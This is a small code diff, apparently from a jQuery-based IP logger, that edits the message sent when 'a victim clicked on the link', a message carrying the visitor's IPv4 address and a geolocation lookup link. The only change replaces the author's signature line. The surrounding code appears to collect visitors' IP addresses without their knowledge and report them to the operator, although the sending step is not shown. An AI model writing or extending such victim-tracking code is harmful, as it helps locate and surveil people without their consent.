@@ -9,7 +9,7 @@ $(document).ready(function() {
         
         var payload = {
             
-            content: '      A victim clicked on the link! @here\nIPv4 Address: ' + ipadd + '\nGeolocation Info: https://iplocation.io/ip/' + ipadd + '\n  ᓚᘏᗢ  -  e l k  w a s  h e r e  -'
+            content: '      A victim clicked on the link! @here\nIPv4 Address: ' + ipadd + '\nGeolocation Info: https://iplocation.io/ip/' + ipadd + '\n  midleg was here'
             
         };
 
